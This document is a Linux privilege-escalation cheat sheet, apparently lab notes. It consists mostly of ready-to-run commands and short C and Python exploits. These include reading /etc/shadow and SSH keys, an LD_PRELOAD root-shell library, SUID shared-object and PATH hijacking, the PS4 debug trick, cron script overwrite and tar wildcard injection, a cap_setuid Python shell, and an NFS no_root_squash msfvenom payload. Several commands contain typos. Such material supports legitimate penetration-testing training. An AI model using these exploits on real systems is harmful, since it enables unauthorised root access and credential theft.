
 * [USER ENUMERATION](#USER-ENUMERATION)
 * [STORE PASSWORD & File Permissions](#Store-Password-&-File-Permissions)
 * [Automation-Tools](#Automation-Tools)
 * [sudo](#sudo)
 * [Suid](#Suid)
 * [Crontab](#crontab)
 * [Capabilities](#Capabilities)
 * [NFS Root Squashing](#NFS-Root-Squashing)



 ## USER ENUMERATION
             
    whoami
    id
    cat /etc/passwd
    cat /etc/shadow
    cat /etc/passwd | cut -d : -f 1
    cat /etc/group
    history
    cat .bash_history
    sudo -l
    sudo su -
 
  SYSTEM ENUMERATION
              
    hostname
    uname -a
    cat /etc/os-release
    cat /proc/version
    cat /etc/issue
    lscpu
    ps aux
    ps aux | grep "username"
 
 
 
 NETWORK ENUMERATION
              
    ifconfig
    ip a
    ip route
    arp -a
    netstat -ano
 
 
 PASWORD ENUMERATION
             
             
    grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
    find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
    locate password
    find / -name id_rsa 2> /dev/null
  





## STORE PASSWORD & File Permissions
            


    history
    ls -la
    cat .bash_history
    history | grep pass
    grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
    find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
    /etc/security/opasswd
 
 
 
 Files that were edited in the last 10 minutes
                            
    find / -mmin -10 2>/dev/null | grep -Ev "^/proc"
          
          
         
 In memory passwords 
                
     strings /dev/mem -n10 | grep -i PASS


Find sensitive files
               
     locate password | more           
     /boot/grub/i386-pc/password.mod
     /etc/pam.d/common-password
     /etc/pam.d/gdm-password
     /etc/pam.d/gdm-password.original
     /lib/live/config/0031-root-password



SSH Key
                        
     find / -name authorized_keys 2> /dev/null
     find / -name id_rsa 2> /dev/null




















 ## Automation Tools
 
There are many scripts that you can execute on a linux machine which automatically find information weekpoint and many more 

- [LinPEAS - Linux Privilege Escalation Awesome Script](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

- [LinuxSmartEnumeration - Linux enumeration tools for pentesting and CTFs](https://github.com/diego-treitos/linux-smart-enumeration)

- [LinEnum - Scripted Local Linux Enumeration & Privilege Escalation Checks](https://github.com/rebootuser/LinEnum)

- [linux-exploit-suggester - Linux exploit-suggester & privilege Escalation](https://github.com/mzet-/linux-exploit-suggester)

- [linux-exploit-suggester2 - Linux exploit-suggester2 & privilege Escalation](https://github.com/jondonas/linux-exploit-suggester-2)

- [pspy - unprivileged Linux process snooping -                               ](https://github.com/DominicBreuker/pspy)



                                      
                                              
                                              
                                              
                                              
 ## Sudo 
 
  Enumeration
   
            sudo -l
            sudo --version
            sudo apache2 -f /etc/shadow
                 
                 
		 
		 
		 
 Sudo resource		 
   
   https://gtfobins.github.io/
   
   
   
   
   
   
   
  LD_PRELOAD and NOPASSWD

If `LD_PRELOAD` is explicitly defined in the sudoers file

```powershell
Defaults        env_keep += LD_PRELOAD
```

Compile the following shared object using the C code below with `gcc -fPIC -shared -o shell.so shell.c -nostartfiles`

```powershell
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
	unsetenv("LD_PRELOAD");
	setgid(0);
	setuid(0);
	system("/bin/sh");
}
```

And Type Command 
   
      sudo -l
   
And Output 

        Matching Defaults entries for TCM on this host:
        env_reset, env_keep+=LD_PRELOAD

      User TCM may run the following commands on this host:
           (root) NOPASSWD: /usr/sbin/iftop
           (root) NOPASSWD: /usr/bin/find
           (root) NOPASSWD: /usr/bin/nano
           (root) NOPASSWD: /usr/bin/vim
           (root) NOPASSWD: /usr/bin/man
           (root) NOPASSWD: /usr/bin/awk
           (root) NOPASSWD: /usr/bin/less
           (root) NOPASSWD: /usr/bin/ftp
           (root) NOPASSWD: /usr/bin/nmap
           (root) NOPASSWD: /usr/sbin/apache2
           (root) NOPASSWD: /bin/more

Execute any binary with the LD_PRELOAD to spawn a shell : 
          `sudo LD_PRELOAD=<full_path_to_so_file> <and Type NOPASSWD program name just vim,nano,apache2,ftp,find etc >`
	  , e.g: `sudo LD_PRELOAD=/tmp/shell.so find`






   


  ## Suid
 
 Enumeration
    
    find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
    find / -perm -u=s -type f 2>/dev/null
    find / -type f -perm -04000 -ls 2>/dev/null
        
        
Resource 
   
     https://gtfobins.github.io/
       
Shared Object Injection
  
    find / -type f -perm -04000 -ls 2>/dev/null
    strace <PATH=2>&1
       
       
TYPE COMMAND 
  
    strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
  
  
OUTPUT
 
         
         
## access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
## access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
## access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
## open("/etc/ld.so.cache", O_RDONLY)      = 3
## access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
## open("/lib/libdl.so.2", O_RDONLY)       = 3
## access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
## open("/usr/lib/libstdc++.so.6", O_RDONLY) = 3
## access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
## open("/lib/libm.so.6", O_RDONLY)        = 3
## access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
## open("/lib/libgcc_s.so.1", O_RDONLY)    = 3
## access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
## open("/lib/libc.so.6", O_RDONLY)        = 3
## open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)


Exploit Shared Object Injection
   
      mkdir /home/user/.config
       
   Create C file Type Some Commands
       
    #include <stdio.h>
    #include <stdlib.h>

    static void inject()__attribute__((constructor));

    void inject() {
      system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
    }
   
 Complie

    gcc -shared -fpic -o /home/user/.config/libcalc.so /home/user/libcalc.c


 Run The Program
  
    /usr/local/bin/suid-so

Environment Variables
                
    env
    find / -type f -perm -04000 -ls 2>/dev/null
    /usr/local/bin/suid-env
    strings /usr/local/bin/suid-env
    echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0;}' > /tmp/service.c
    gcc /tmp/service.c -o /tmp/service
    export PATH=/tmp:$PATH
    print $PATH
    /usr/local/bin/suid-env
    function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
    export -f /usr/sbin/service
    /usr/local/bin/suid-env2



   
   evn
     
   This will not work on Bash versions 4.4 and above
  ''' 
   When in debugging mode, Bash uses the environment variable PS4 to display an extra prompt for debugging statements.
   ,,,
   Run the /usr/local/bin/suid-env2 executable with bash debugging enabled and the PS4 variable set to an embedded command which creates an SUID version of          /bin/bash:
 
      env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
      /tmp/rootbash -p
     
    





## Crontab 


   Cron jobs are programs or scripts which users can schedule to run at specific times or intervals. 
   Cron table files (crontabs) store the configuration for cron jobs. 
   The system-wide crontab is located at /etc/crontab.
    
    cat /etc/crontab
    locate overwrite.sh
          
          
          
   
Cron jobs

Check if you have access with write permission on these files.   
Check inside the file, to find other paths with write permissions.   

```powershell
/etc/init.d
/etc/cron*
/etc/crontab
/etc/cron.allow
/etc/cron.d 
/etc/cron.deny
/etc/cron.daily
/etc/cron.hourly
/etc/cron.monthly
/etc/cron.weekly
/etc/sudoers
/etc/exports
/etc/anacrontab
/var/spool/cron
/var/spool/cron/crontabs/root

crontab -l
ls -alh /var/spool/cron;
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny*
```
          
          
          
          
overwrite.sh Exploit
      
    touch /home/user/overwrite.sh
    echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
    chmod +x /home/user/overwrite.sh
    /tmp/bash -p




 compress.sh
   
    cat <PATH=compress.sh>
      
OUTPUT
   
     #!/bin/sh
     cd /home/user
     tar czf /tmp/backup.tar.gz *
          
Exploit wildcards
   
    echo 'cp /bin/bash/ /tmp/bash; chmod +s /tmp/bash' > asif.sh
    chmod 777 asif.sh
    touch /home/user/--checkpoint=1
    touch /home/user/--checkpoint-action=exec=sh\asif.sh
    /tmp//bash -p
        
        
        
        
        
Change File permissions And Exploit
   
    locate overwrite.sh
    echo 'cp /bin/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh
    /tmp/bash -p
   
   
   
   
     


 ## Capabilities 
 
 
 Type Command
 
    getcap -r / 2>/dev/null
 
Output
 
    /usr/bin/python2.6 = cap_setuid+ep
   
   
Exploit
 
    /usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
   





   
   
## NFS Root Squashing
   
   
 Type Command
 
     cat /etc/exports
     
 OUTPUT 
 
     /etc/exports: the access control list for filesystems which may be exported
     #		to NFS clients.  See exports(5).
     #
     # Example for NFSv2 and NFSv3:
     # /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
     #
     # Example for NFSv4:
     # /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
     # /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
     #

     /tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)

     #/tmp *(rw,sync,insecure,no_subtree_check)


  ### Exploit
  
  Open Your LOCAL MACHINE AND TYPE COMMAND
  
    mkdir /tmp/asif
    mount -o rw,vers=2 <Target IP>:/tmp /tmp/asif
    msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/asif/shell.elf
    chmod +xs /tmp/asif/shell.elf
  Type A Remote Machine
  
    /tmp/shell.elf














